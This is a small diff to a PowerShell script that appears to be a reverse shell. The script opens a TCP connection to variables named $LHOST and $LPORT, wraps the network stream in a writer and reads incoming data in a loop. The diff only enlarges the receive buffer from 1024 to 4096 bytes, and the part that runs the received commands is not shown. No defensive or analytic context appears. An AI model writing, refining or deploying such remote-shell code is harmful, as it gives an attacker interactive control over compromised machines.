@@ -4,7 +4,7 @@ $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT);
 $NetworkStream = $TCPClient.GetStream();
 $StreamWriter = New-Object IO.StreamWriter($NetworkStream);
 $StreamWriter.AutoFlush = $true;
-$Buffer = New-Object System.Byte[] 1024;
+$Buffer = New-Object System.Byte[] 4096;
 
 while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
 
